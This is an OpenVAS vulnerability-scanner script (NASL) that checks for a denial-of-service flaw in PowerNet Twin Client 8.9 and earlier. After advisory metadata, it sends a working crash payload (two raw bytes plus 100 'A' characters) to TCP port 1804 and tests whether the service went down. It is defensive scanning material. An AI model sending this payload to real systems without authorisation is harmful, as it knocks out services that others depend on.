###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_powernet_twin_client_rfsync_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# PowerNet Twin Client 'RFSynC' Denial of Service Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial of service condition.
  Impact Level: Application";
tag_affected = "PowerNet Twin Client 8.9 and prior";
tag_insight = "A signedness error in 'RFSync.exe' when processing certain requests, can be
  exploited to cause a crash via a specially crafted request sent to TCP
  port 1804.";
tag_solution = "No solution or patch is available as of 03rd July, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to
  http://www.honeywellaidc.com/en-US/Pages/Product.aspx?category=Software&cat=HSM&pid=PowerNet Twin Client";
tag_summary = "The host is running PowerNet Twin Client and is prone to denial of
  service vulnerability.";

if(description)
{
  script_id(802905);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-07-03 18:13:10 +0530 (Tue, 03 Jul 2012)");
  script_name("PowerNet Twin Client 'RFSynC' Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/83395");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49754/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/19456/");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/powernet_1-adv.txt");

  script_description(desc);
  script_summary("Check PowerNet Twin Client is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports(1804);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

## Variable Initialization
req = "";
res = "";
port = 0;
soc = 0;
soc1 = 0;

## Port
port = 1804;

## Open the TCP socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Construct attack request
req = raw_string(0x11, 0x00) + crap(length:100, data:"A");

## Send crafted request
res = send(socket:soc, data:req);
close(soc);

sleep(2);

## Open the socket to confirm application is crashed
soc1 = open_sock_tcp(port);
if(!soc1)
{
  security_hole(port);
  exit(0);
}

close(soc1);
